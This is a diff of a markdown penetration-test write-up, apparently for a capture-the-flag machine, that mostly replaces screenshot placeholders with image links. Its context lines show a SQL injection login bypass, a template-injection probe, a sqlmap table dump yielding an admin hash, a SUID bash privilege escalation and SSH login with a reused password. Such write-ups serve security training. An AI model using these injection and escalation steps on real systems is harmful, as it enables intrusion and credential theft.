@@ -317,11 +317,13 @@ admin' or 1=1 -- -
 {{7*7}}
 → Rendered output: 49
 ```
-![SSTI - check](./images/SSTI check.png)
+![SSTI - check](./images/SSTI_check.png)
 
-![SSTI -confirmed](./images/SSTI check - confirmed.png)
+![SSTI - check](./images/SSTI_check-confirmed.png)
 
+![SSTI - check](./images/SSTI_payload.png)
 
+![SSTI - check](./images/reverse_shell.png)
 
 ---
 
@@ -342,7 +344,8 @@ admin' or 1=1 -- -
 sqlmap -r goodgames.req -D main -T user --dump
 → admin : 2b22337f218b2d82dfc3b6f77e7cb8ec
 ```
-`[Insert screenshot: sqlmap dump output]`
+
+![SSTI - check](./images/database_dump.png)
 
 ---
 
@@ -369,7 +372,10 @@ chmod 4755 bash
 ls -la bash
 -rwsr-xr-x 1 root root 1168776 Sep 8 01:12 bash
 ```
-`[Insert screenshot: SUID bash + root.txt capture]`
+
+![SSTI - check](./images/docker_bind.png)
+
+![SSTI - check](./images/root_flag.png)
 
 ---
 
@@ -391,7 +397,8 @@ ssh augustus@172.19.0.1
 Password: [REDACTED — matches cracked admin hash from Finding 3]
 → Authentication successful
 ```
-`[Insert screenshot: SSH login as augustus]`
+
+![SSTI - check](./images/ssh.png)
 
 ---
 
